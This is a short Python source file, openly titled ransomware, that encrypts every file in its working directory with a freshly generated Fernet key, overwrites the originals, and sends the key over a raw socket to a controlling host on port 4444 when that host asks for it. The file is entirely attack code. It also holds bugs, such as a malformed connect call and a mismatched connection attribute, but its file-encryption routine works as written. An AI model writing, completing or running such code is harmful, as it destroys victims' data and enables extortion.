import os
from cryptography.fernet import Fernet
import socket
import simplejson

class Ransomware:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect(f"{ip}",port)

    def json_send(self,data):
        json_data = simplejson.dumps(data).encode("utf-8")
        self.my_connection.send(json_data)	
	
    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def crypt(self):
        file_list = []

        for file in os.listdir():
            if file == "Ransomware.py":
                continue
            if os.path.isfile(file):
                file_list.append(file)

        self.key = Fernet.generate_key()



        for file in file_list:
            with open(file,"rb") as the_file:
                contents = the_file.read()
            contents_encrypt = Fernet(self.key).encrypt(contents)
            with open(file,"wb") as the_file:
                the_file.write(contents_encrypt)

    def send_key(self):
        while True:
            command = self.json_recv()
            if command == '1':
                self.json_send(self.key)
        
test1 = Ransomware("0.0.0.0",4444)
test1.crypt()
test1.send_key()